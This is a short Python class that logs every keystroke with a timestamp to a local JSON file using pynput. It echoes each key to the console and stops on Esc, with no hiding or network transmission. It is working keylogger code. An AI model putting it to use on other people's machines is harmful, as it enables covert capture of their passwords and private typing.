from pynput import keyboard
import json
from datetime import datetime

class KeyLogger:
    def __init__(self, log_file='keylog.json'):
        self.log_file = log_file
        self.logs = []

    def on_press(self, key):
        try:
            key_data = {
                'key': key.char,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
        except AttributeError:
            key_data = {
                'key': str(key),
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }

        self.logs.append(key_data)
        print(f"Key pressed: {key_data['key']} at {key_data['timestamp']}")

        # Optionally, save logs after each key press
        self.save_logs()

    def on_release(self, key):
        # Stop listener by pressing Esc key
        if key == keyboard.Key.esc:
            return False

    def save_logs(self):
        with open(self.log_file, 'w') as f:
            json.dump(self.logs, f, indent=4)

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
